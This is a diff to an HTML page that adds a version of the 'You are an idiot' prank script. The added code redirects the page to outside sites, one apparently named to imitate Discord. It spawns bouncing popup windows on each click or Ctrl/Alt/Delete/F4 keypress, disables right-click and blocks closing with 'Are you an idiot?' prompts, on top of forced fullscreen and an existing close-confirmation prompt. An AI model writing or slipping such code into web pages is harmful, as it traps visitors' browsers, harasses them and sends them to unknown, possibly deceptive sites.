@@ -6,8 +6,96 @@
   window.onbeforeunload = function(e) {
     e.returnValue = "本当にページを閉じますか？";
   }
+    window.location.href = 'https://discord-velseons.github.io/delta.html'
+window.location.href = 'https://discord-velseons.github.io/'
+window.location.href = 'https://kekma.net/'
 document.body.requestFullscreen();	
 </script>
+    <link type="text/css" rel="stylesheet" charset="UTF-8" href="https://www.gstatic.com/_/translate_http/_/ss/k=translate_http.tr.26tY-h6gH9w.L.W.O/am=BgM/d=0/rs=AN8SPfowrRiAotkQD9r4k3ANeQYGsCLZ7g/m=el_main_css">
+    <script>
+        let xOff = 5;
+let yOff = 5;
+let xPos = 400;
+let yPos = -100;
+
+function randomRange(min, max) {
+	min = Math.ceil(min);
+	max = Math.floor(max);
+  
+	return Math.floor(Math.random() * (max - min + 1) + min);
+}
+
+function changeTitle(title) {
+	document.title = title;
+}
+
+function openWindow(url) {
+	window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+}
+
+async function proCreate(count) {	
+	for (let i = 0; i < count; i++) {
+		openWindow('lol.html');
+		await new Promise(r => setTimeout(r, 50));
+	}
+}
+
+function newXlt() {
+	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+	window.focus();
+}
+
+function newXrt() {
+	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
+	window.focus();
+}
+
+function newYup() {
+	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+	window.focus();
+}
+
+function newYdn() {
+	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
+	window.focus();
+}
+
+function playBall() {
+    xPos += xOff;
+    yPos += yOff;
+    
+	if (xPos > screen.width - 357) newXlt();    
+	if (xPos < 0) newXrt();
+    
+	if (yPos > screen.height - 330) newYup(); 		
+	if (yPos < 0) newYdn();
+
+    window.moveTo(xPos, yPos);
+    setTimeout(playBall, 1);
+}
+        /*
+ * [Aug 2023] Fixed the popup mechanism, made it more robust.
+ *
+ * Requires safe.js & math.js preload.
+ */
+document.addEventListener("click", async () => {
+	await proCreate(3);
+});
+
+window.onload = playBall;
+window.oncontextmenu = () => false;
+window.onkeydown = async () => {
+	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
+		await proCreate(3);
+
+		alert("You are an idiot!");
+	}
+
+	return null;
+}
+window.onbeforeunload = () => "Are you an idiot?";
+/* [Aug 2023] End of amendments. */
+    </script>
   <style>
 body {
   background-color: #000;
